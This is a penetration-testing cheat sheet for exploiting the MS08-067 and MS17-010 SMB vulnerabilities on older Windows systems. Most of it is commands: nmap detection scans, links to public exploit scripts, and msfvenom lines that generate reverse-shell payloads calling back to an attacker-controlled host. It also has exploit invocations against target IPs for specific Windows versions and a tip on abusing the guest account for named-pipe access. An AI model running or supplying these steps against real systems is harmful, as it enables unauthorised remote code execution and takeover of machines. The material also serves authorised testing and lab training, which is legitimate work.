# 11. SMB common exploitation  

## MS08-067 (Windows 2000/XP/2003)
### Detection  
```bash
nmap --script smb-vuln-ms08-067 <ip_netblock> -p445  
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.10.10.4  
```  
  
### Where 
- [https://raw.githubusercontent.com/jivoi/pentest/master/exploit\_win/ms08-067.py](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py)  
  
### Exploitation 
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows  

# Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
# Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
# Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
# Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
# Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
# Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
# Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
python ms08-067.py 10.0.0.1 6 445
```
  

## MS17-010 (No Metasploit)
### MS17-010 (EternalChampion) -> Need accessible Named Pipe
Notes :
- Windows XP / 2003
- Windows 7 (Need credentials or anonymous connection allowed to access to named pipe)

Detection:
```bash
nmap  --script=smb-vuln-ms17-010 <ip_netblock> -p445
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.10.10.4
```

Where:
- git clone https://github.com/helviojunior/MS17-010

Exploitation:
```bash
# Named pipes file:
# cat /usr/share/metasploit-framework/data/wordlists/named_pipes.txt
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
python2 send_and_execute.py 10.0.0.1 revshell.exe
```

NOTES
- Since Windows Vista, default settings does not allow anonymous to access any named pipe
- In order to exploit this vulnerability some credentials need to be used.
	- Using the “guest” can be a valid solution. This account doesn't need any password and thus allow us to access a named pipe and get code execution